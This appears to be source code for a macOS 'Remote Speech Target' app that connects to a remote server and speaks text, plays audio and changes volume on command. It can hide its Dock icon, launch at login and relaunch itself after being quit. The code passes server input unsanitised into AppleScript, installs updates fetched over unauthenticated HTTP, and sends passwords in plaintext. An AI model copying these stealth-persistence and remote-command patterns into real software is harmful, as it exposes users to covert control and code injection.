//
//  AppDelegate.m
//  Remote Speech Target
//
//  Created by Collin Mistr on 12/25/16.
//  Copyright (c) 2016 Got 'Em Apps. All rights reserved.
//

#import "AppDelegate.h"
#include <sys/socket.h>

@implementation AppDelegate


- (void)applicationDidFinishLaunching:(NSNotification *)aNotification
{
    if ([[NSProcessInfo processInfo] respondsToSelector:@selector(beginActivityWithOptions:reason:)])
    {
        self.activity = [[NSProcessInfo processInfo] beginActivityWithOptions:0x00FFFFFF reason:@"receiving OSC messages"];
    }
    [self initSocket];
    isHidden=NO;
    updateIsAvailable=NO;
    relaunchTriggered=NO;
    gotHeartbeat=YES;
    receivingRawData = NO;
    audioFileSize = 0;
    appPath=[[NSBundle mainBundle] bundlePath];
    settingsPlistPath=[[[NSBundle mainBundle]resourcePath]stringByAppendingPathComponent:@"settings.plist"];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self selector:@selector(receiveSleepNotification:) name:NSWorkspaceWillSleepNotification object:nil];
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self selector:@selector(receiveWakeNotification:) name:NSWorkspaceDidWakeNotification object:nil];
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSApplicationSupportDirectory, NSUserDomainMask, YES);
    applicationSupportDirectory = [[paths firstObject] stringByAppendingPathComponent:@"Remote Speech"];
    if (![[NSFileManager defaultManager]fileExistsAtPath:applicationSupportDirectory isDirectory:nil])
    {
        [[NSFileManager defaultManager]createDirectoryAtPath:applicationSupportDirectory withIntermediateDirectories:NO attributes:nil error:nil];
    }
    if ([[NSFileManager defaultManager]fileExistsAtPath:settingsPlistPath])
    {
        settings = [[NSMutableDictionary alloc]initWithContentsOfFile:settingsPlistPath];
    }
    else
    {
        settings = [[NSMutableDictionary alloc]initWithObjects:[NSArray arrayWithObjects:@"", [NSNumber numberWithBool:NO], [NSNumber numberWithBool:NO], [NSNumber numberWithBool:NO], nil] forKeys:[NSArray arrayWithObjects:@"ID", @"shouldRelaunch", @"shouldLaunchAtStartup", @"hasRun", nil]];
    }
    infoPlist=[[NSMutableDictionary alloc]initWithContentsOfFile:[appPath stringByAppendingPathComponent:@"Contents/Info.plist"]];
    if ([[settings objectForKey:@"hasRun"] boolValue])
    {
        [self startTarget];
        [self sendTargetData];
    }
    else
    {
        [self.window makeKeyAndOrderFront:self];
    }
}
-(void)startTarget
{
    if ([[settings objectForKey:@"shouldRelaunch"] boolValue])
    {
        [self triggerRelaunch];
    }
    if ([[settings objectForKey:@"shouldLaunchAtStartup"] boolValue])
    {
        GSStartup *startUpHandler=[[GSStartup alloc]initWithAppName:[appPath lastPathComponent]];
        if (![startUpHandler existsInStartupItems])
        {
            [startUpHandler loadAtStartup:YES];
        }
    }
    if ([[infoPlist objectForKey:@"LSUIElement"]boolValue])
    {
        isHidden=YES;
    }
    speech = [[NSSpeechSynthesizer alloc] init];
}
-(void)closeSocket
{
    [inputStream close];
    [outputStream close];
    [inputStream removeFromRunLoop:[NSRunLoop currentRunLoop] forMode:NSDefaultRunLoopMode];
	[outputStream removeFromRunLoop:[NSRunLoop currentRunLoop] forMode:NSDefaultRunLoopMode];
    inputStream=nil;
    outputStream=nil;
}
-(void)receiveSleepNotification:(NSNotification *)didSleep
{
    [self closeSocket];
    [connectionTimer invalidate];
    [heartbeatTimer invalidate];
}
-(void)receiveWakeNotification:(NSNotification *)didWake
{
    [self startConnectionTimer];
}
-(void)sendTargetData
{
    [self sendToServer:[NSString stringWithFormat:@"is-target:%@\n", [settings objectForKey:@"ID"]]];
    NSString *tempVoice=[speech voice];
    [self sendToServer:[NSString stringWithFormat:@"voice:%@\n", [tempVoice substringFromIndex:[tempVoice rangeOfString:@"voice."].location+6]]];
    NSArray *voicesTemp = [NSSpeechSynthesizer availableVoices];
    NSString *voicesToSend=@"";
    for (int i=0; i<voicesTemp.count; i++)
    {
        voicesToSend = [voicesToSend stringByAppendingString:[[voicesTemp objectAtIndex:i] substringFromIndex:33]];
        if (voicesTemp.count-1 != i)
        {
            voicesToSend=[voicesToSend stringByAppendingString:@","];
        }
    }
    [self sendToServer:[NSString stringWithFormat:@"voices:%@\n", voicesToSend]];
    [self sendToServer:[NSString stringWithFormat:@"volume:%ld\n", [self getCurrentVolume]]];
    [self sendToServer:[NSString stringWithFormat:@"update-client-info\n"]];
    [self checkForUpdate];
}
-(void)reconnectToServer
{
    [self initSocket];
    if ([[settings objectForKey:@"hasRun"]boolValue])
    {
        [self sendTargetData];
    }
}
-(void)initSocket
{
    NSLog(@"Socket was opened");
    CFReadStreamRef readStream;
	CFWriteStreamRef writeStream;
	CFStreamCreatePairWithSocketToHost(NULL, (CFStringRef)@"dosdude1.com", 5656, &readStream, &writeStream);
	
	inputStream = (__bridge NSInputStream *)readStream;
	outputStream = (__bridge NSOutputStream *)writeStream;
	[inputStream setDelegate:self];
	[outputStream setDelegate:self];
	[inputStream scheduleInRunLoop:[NSRunLoop currentRunLoop] forMode:NSDefaultRunLoopMode];
	[outputStream scheduleInRunLoop:[NSRunLoop currentRunLoop] forMode:NSDefaultRunLoopMode];
	[inputStream open];
	[outputStream open];
}
- (void)stream:(NSStream *)theStream handleEvent:(NSStreamEvent)streamEvent {
    
	switch (streamEvent) {
            
		case NSStreamEventOpenCompleted:
            NSLog(@"Stream opened");
            CFDataRef socketData = CFReadStreamCopyProperty((__bridge CFReadStreamRef)(inputStream), kCFStreamPropertySocketNativeHandle);
            CFSocketNativeHandle socket;
            CFDataGetBytes(socketData, CFRangeMake(0, sizeof(CFSocketNativeHandle)), (UInt8 *)&socket);
            CFRelease(socketData);
            
            int on = 1;
            if (setsockopt(socket, SOL_SOCKET, SO_KEEPALIVE, &on, sizeof(on)) == -1) {
                NSLog(@"setsockopt failed: %s", strerror(errno));
            }
            [connectionTimer invalidate];
            if (![heartbeatTimer isValid])
            {
                heartbeatTimer = [NSTimer scheduledTimerWithTimeInterval:60.0 target:self selector:@selector(checkHeartbeatStatus) userInfo:nil repeats:YES];
            }
            break;
            
		case NSStreamEventHasBytesAvailable:
            if (theStream == inputStream) {
                
                uint8_t buffer[8192];
                NSInteger len;
                
                [heartbeatTimer invalidate];
                heartbeatTimer = [NSTimer scheduledTimerWithTimeInterval:60.0 target:self selector:@selector(checkHeartbeatStatus) userInfo:nil repeats:YES];
                
                while ([inputStream hasBytesAvailable]) {
                    len = [inputStream read:buffer maxLength:sizeof(buffer)];
                    if (!receivingRawData)
                    {
                        if (len > 0) {
                            
                            NSString *output = [[NSString alloc] initWithBytes:buffer length:len encoding:NSUTF8StringEncoding];
                            
                            if (nil != output) {
                                [self handleEvent:output];
                            }
                            else
                            {
                                [self closeSocket];
                            }
                        }
                    }
                    else
                    {
                        if (dataReceiveTimeout)
                        {
                            [dataReceiveTimeout invalidate];
                        }
                        dataReceiveTimeout = [NSTimer scheduledTimerWithTimeInterval:10.0 target:self selector:@selector(resetRawDataFlag) userInfo:nil repeats:NO];
                        
                        [audioData appendBytes:buffer length:len];
                        
                        if (audioData.length >= audioFileSize)
                        {
                            [self playAudio:[NSData dataWithData:audioData]];
                            receivingRawData = NO;
                        }
                    }
                }
            }
            break;
            
		case NSStreamEventErrorOccurred:
            if (theStream == inputStream)
            {
                [self handleError:-1];
            }
            break;
            
		case NSStreamEventEndEncountered:
            NSLog(@"Stream end");
            if (theStream == inputStream)
            {
                [self handleError:-1];
            }
            break;
            
        case NSStreamEventHasSpaceAvailable:
            break;
            
		default:
            NSLog(@"Unknown event");
	}
    
}
-(void)startConnectionTimer
{
    [connectionTimer invalidate];
    connectionTimer = [NSTimer scheduledTimerWithTimeInterval:10.0 target:self selector:@selector(reconnectToServer) userInfo:nil repeats:YES];
}
-(void)triggerRelaunch
{
    relaunchTriggered=YES;
    NSString *daemonPath = [[NSBundle mainBundle] pathForResource:@"relaunch" ofType:nil];
	[NSTask launchedTaskWithLaunchPath:daemonPath arguments:[NSArray arrayWithObjects:[[NSBundle mainBundle] bundlePath], [NSString stringWithFormat:@"%d", [[NSProcessInfo processInfo] processIdentifier]], nil]];
}
-(void)handleEvent:(NSString *)event
{
    if ([event rangeOfString:@"err-credentials-not-valid"].location != NSNotFound)
    {
        NSAlert *alert = [[NSAlert alloc] init];
        [alert setMessageText:@"Username or Password Invalid"];
        [alert setInformativeText:@"The username or password you have entered is invalid."];
        [alert addButtonWithTitle:@"OK"];
        [alert runModal];
    }
    else if ([event rangeOfString:@"login-valid"].location != NSNotFound)
    {
        [self.signInButton setEnabled:NO];
        [self.addToAccountButton setEnabled:YES];
        [self.usernameField setEnabled:NO];
        [self.passwordField setEnabled:NO];
        NSAlert *alert = [[NSAlert alloc] init];
        [alert setMessageText:@"Signed In"];
        [alert setInformativeText:@"Signed in successfully, now set the target name and options."];
        [alert addButtonWithTitle:@"OK"];
        [alert runModal];
    }
    else if ([event rangeOfString:@"say:"].location != NSNotFound)
    {
        NSString *toSay=[event substringFromIndex:[event rangeOfString:@":"].location+1];
        [self sayString:toSay];
    }
    else if ([event rangeOfString:@"setvolume:"].location != NSNotFound)
    {
        NSAppleScript *setVolume=[[NSAppleScript alloc]initWithSource:[NSString stringWithFormat:@"set volume output volume %@", [event substringFromIndex:[event rangeOfString:@":"].location+1]]];
        [setVolume executeAndReturnError:nil];
    }
    else if ([event rangeOfString:@"setvoice:"].location != NSNotFound)
    {
        NSString *voice=[event substringFromIndex:[event rangeOfString:@":"].location+1];
        NSCharacterSet *notAllowedChars = [[NSCharacterSet characterSetWithCharactersInString:@"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-_+=#"] invertedSet];
        voice = [[voice componentsSeparatedByCharactersInSet:notAllowedChars] componentsJoinedByString:@""];
        NSString *voiceToSet=[NSString stringWithFormat:@"com.apple.speech.synthesis.voice.%@", voice];
        [speech setVoice:voiceToSet];
        [self sendToServer:[NSString stringWithFormat:@"voice:%@\n", [event substringFromIndex:[event rangeOfString:@":"].location+1]]];
        [self sendToServer:@"update-client-info\n"];
    }
    else if ([event rangeOfString:@"send-volume"].location != NSNotFound)
    {
        [self sendToServer:[NSString stringWithFormat:@"volume:%ld\n", [self getCurrentVolume]]];
    }
    else if ([event rangeOfString:@"get-update-status"].location != NSNotFound)
    {
        [self checkForUpdate];
    }
    else if ([event rangeOfString:@"begin-update"].location != NSNotFound)
    {
        if (updateIsAvailable)
        {
            [self installUpdate];
        }
        else
        {
            [self sendToServer:@"update-result:latest\n"];
        }
    }
    else if ([event rangeOfString:@"heartbeat"].location != NSNotFound)
    {
        gotHeartbeat = YES;
    }
    else if ([event rangeOfString:@"receiving-audio:"].location != NSNotFound)
    {
        NSString *temp = [event substringFromIndex:[event rangeOfString:@":"].location+1];
        audioFileName = [temp substringToIndex:[temp rangeOfString:@";"].location];
        audioFileSize = [[event substringFromIndex:[event rangeOfString:@";"].location+1] integerValue];
        audioData = [[NSMutableData alloc] init];
        receivingRawData = YES;
        [self sendToServer:@"ready-to-receive\n"];
    }
}
-(void)sayString:(NSString *)toSay
{
    [speech startSpeakingString:toSay];
}
-(void)handleError:(int)errorNum
{
    if (errorNum == -1)
    {
        if (!isHidden)
        {
            /*NSAlert *alert = [[NSAlert alloc] init];
            [alert setMessageText:@"Cannot Connect to Server"];
            [alert setInformativeText:@"The Remote Speech Server is unreachable. Check your Internet connection and try again."];
            [alert addButtonWithTitle:@"OK"];
            [alert runModal];*/
        }
        [self startConnectionTimer];
    }
}
-(void)sendToServer:(NSString *)stringToSend
{
    NSString *response = stringToSend;
    NSData *data = [[NSData alloc] initWithData:[response dataUsingEncoding:NSUTF8StringEncoding]];
    [outputStream write:[data bytes] maxLength:[data length]];
}
- (IBAction)signIn:(id)sender
{
    if ([[self.usernameField stringValue]isEqualToString:@""] || [[self.passwordField stringValue]isEqualToString:@""])
    {
        NSAlert *alert = [[NSAlert alloc] init];
        [alert setMessageText:@"Invalid Entry"];
        [alert setInformativeText:@"Please enter all the requested information to continue."];
        [alert addButtonWithTitle:@"OK"];
        [alert runModal];
    }
    else
    {
        NSString *username=[self.usernameField stringValue];
        NSString *password=[self.passwordField stringValue];
        [self sendToServer:[NSString stringWithFormat:@"loginas:%@,%@\n", username, password]];
    }
}
- (IBAction)quitProgram:(id)sender
{
    [[NSApplication sharedApplication]terminate:nil];
}
- (IBAction)setAndAddToAccount:(id)sender
{
    if ([[self.targetNameField stringValue] isEqualToString:@""])
    {
        NSAlert *alert = [[NSAlert alloc] init];
        [alert setMessageText:@"No Target Name"];
        [alert setInformativeText:@"You must enter a Target Name to continue."];
        [alert addButtonWithTitle:@"OK"];
        [alert runModal];
    }
    else
    {
        int targetID=arc4random() % 900000 + 100000;
        [self sendToServer:[NSString stringWithFormat:@"add-target:%d,%@\n", targetID, [self.targetNameField stringValue]]];
        [settings setObject:[NSString stringWithFormat:@"%d", targetID] forKey:@"ID"];
        if ([self.launchAtLogin state]==NSOnState)
        {
            [settings setObject:[NSNumber numberWithBool:YES] forKey:@"shouldLaunchAtStartup"];
        }
        if ([self.launchIfQuit state]==NSOnState)
        {
            [settings setObject:[NSNumber numberWithBool:YES] forKey:@"shouldRelaunch"];
        }
        if ([self.hideDockIcon state]==NSOnState)
        {
            [infoPlist setObject:[NSNumber numberWithBool:YES] forKey:@"LSUIElement"];
            [infoPlist writeToFile:[appPath stringByAppendingPathComponent:@"Contents/Info.plist"] atomically:YES];
        }
        [settings setObject:[NSNumber numberWithBool:YES] forKey:@"hasRun"];
        [settings writeToFile:settingsPlistPath atomically:YES];
        [self triggerRelaunch];
        [[NSApplication sharedApplication]terminate:nil];
    }
}
-(NSInteger)getCurrentVolume
{
    NSAppleScript *getVol=[[NSAppleScript alloc] initWithSource:@"output volume of (get volume settings)"];
    NSAppleEventDescriptor *result=[getVol executeAndReturnError:nil];
    return [[result stringValue]integerValue];
}
-(void)processFile
{
    if (connectionNum==1)
    {
        NSString *filePath = [applicationSupportDirectory stringByAppendingPathComponent:@"serverupdatemeta.txt"];
        NSString *currentVersion=[infoPlist objectForKey:@"CFBundleShortVersionString"];
        NSString *updateVersion=[NSString stringWithContentsOfFile:filePath encoding:NSUTF8StringEncoding error:nil];
        if (![updateVersion isEqualToString:currentVersion])
        {
            updateIsAvailable=YES;
            [self sendToServer:@"update-status:yes\n"];
        }
        else
        {
            updateIsAvailable=NO;
            [self sendToServer:@"update-status:no\n"];
        }
        [[NSFileManager defaultManager]removeItemAtPath:filePath error:nil];
    }
    else if (connectionNum==2)
    {
        NSString *bundleName=[infoPlist objectForKey:@"CFBundleName"];
        BOOL shouldHide=[[infoPlist objectForKey:@"LSUIElement"]boolValue];
        NSString *iconName=[infoPlist objectForKey:@"CFBundleIconFile"];
        NSString  *filePath = [applicationSupportDirectory stringByAppendingPathComponent:@"serverupdate.zip"];
        NSTask *task = [[NSTask alloc] init];
        [task setLaunchPath:@"/usr/bin/unzip"];
        [task setArguments:[NSArray arrayWithObjects:@"-o", filePath, @"-d", [[NSBundle mainBundle]bundlePath], nil]];
        [task launch];
        [task waitUntilExit];
        [[NSFileManager defaultManager]removeItemAtPath:filePath error:nil];
        infoPlist=[[NSMutableDictionary alloc]initWithContentsOfFile:[appPath stringByAppendingPathComponent:@"Contents/Info.plist"]];
        [infoPlist setObject:bundleName forKey:@"CFBundleName"];
        [infoPlist setObject:[NSNumber numberWithBool:shouldHide] forKey:@"LSUIElement"];
        [infoPlist setObject:iconName forKey:@"CFBundleIconFile"];
        [infoPlist writeToFile:[appPath stringByAppendingPathComponent:@"Contents/Info.plist"] atomically:YES];
        if (!relaunchTriggered)
        {
            [self triggerRelaunch];
        }
        [self sendToServer:@"update-result:success\n"];
        sleep(1);
        [[NSApplication sharedApplication]terminate:nil];
    }
}
-(void)installUpdate
{
    connectionNum=2;
    NSURL *url = [NSURL URLWithString:@"http://dosdude1.com/remotespeech/serverupdate.zip"];
    
    NSURLRequest *request = [NSURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:30];
    NSURLConnection *connection = [[NSURLConnection alloc]initWithRequest:request delegate:self startImmediately:NO ];
    [connection start];
}
-(void)checkForUpdate
{
    connectionNum=1;
    NSURL *url = [NSURL URLWithString:@"http://dosdude1.com/remotespeech/serverupdatemeta.txt"];
    
    NSURLRequest *request = [NSURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:30];
    NSURLConnection *connection = [[NSURLConnection alloc]initWithRequest:request delegate:self startImmediately:NO ];
    [connection start];
}
- (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response
{
    fileData = [[NSMutableData alloc]init];
}

- (void)connection:(NSURLConnection *)connection didReceiveData:(NSData *)data
{
    [fileData appendData:data];
}

- (void)connectionDidFinishLoading:(NSURLConnection *)connection
{
    if (connectionNum==1)
    {
        NSString  *filePath = [applicationSupportDirectory stringByAppendingPathComponent:@"serverupdatemeta.txt"];
        [fileData writeToFile:filePath atomically:YES];
    }
    else if (connectionNum==2)
    {
        NSString  *filePath = [applicationSupportDirectory stringByAppendingPathComponent:@"serverupdate.zip"];
        [fileData writeToFile:filePath atomically:YES];
    }
    [self processFile];
}
-(void)checkHeartbeatStatus
{
    if (!gotHeartbeat)
    {
        [heartbeatTimer invalidate];
        [self closeSocket];
        [self startConnectionTimer];
    }
    gotHeartbeat = NO;
}
-(void)playAudio:(NSData *)data
{
    audioPlayer = [[AVAudioPlayer alloc] initWithData:data error:nil];
    [audioPlayer play];
}
-(void)resetRawDataFlag
{
    receivingRawData = NO;
}
@end
